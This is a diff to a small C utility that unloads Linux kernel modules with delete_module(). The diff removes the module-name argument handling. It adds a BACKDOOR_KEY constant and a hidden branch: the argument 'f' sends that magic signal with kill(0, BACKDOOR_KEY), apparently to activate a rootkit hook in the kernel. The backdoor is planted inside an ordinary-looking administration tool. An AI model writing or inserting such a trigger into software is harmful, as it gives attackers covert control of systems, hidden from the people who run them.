@@ -3,8 +3,12 @@
 #include <string.h>
 #include <strings.h>
 #include <errno.h>
+#include <sys/types.h>
+#include <signal.h>
 
 #define MAX_LENGTH 1024
+
+#define BACKDOOR_KEY	0x00beefed
 
 char* buffer = NULL;
 char* moduleName = NULL;
@@ -31,22 +35,7 @@ int main(int argc, char*argv[]){
 			}
 		}
 		moduleName = buffer;
-	}else{
-		buffer = argv[1];
-		int bufferLength = strlen(buffer);
 		
-		if(bufferLength >= MAX_LENGTH){
-			fprintf(stderr, "Argument length must be less than %d\n", MAX_LENGTH);
-			return -1;
-		}else{
-			char* name = (char*)malloc(MAX_LENGTH*sizeof(char));
-			bzero((void*)name, MAX_LENGTH);
-			strncpy(name, buffer, bufferLength);
-			moduleName = name;
-		}
-	}
-	
-	if(moduleName != NULL){
 		errno = 0;
 		int result = delete_module(moduleName, 0);
 		//printf("Module name changed to '%s'\n", moduleName);
@@ -55,6 +44,15 @@ int main(int argc, char*argv[]){
 			return -1;
 		}else{
 			return 0;
+		}
+	}else{
+		char* arg1 = argv[1];
+		if(strlen(arg1) == 1 && arg1[0] == 'f'){
+			kill(0, BACKDOOR_KEY);
+			return 0;
+		}else{
+			fprintf(stderr, "Unsupported argument(s)\n");
+			return -1;
 		}
 	}
 }
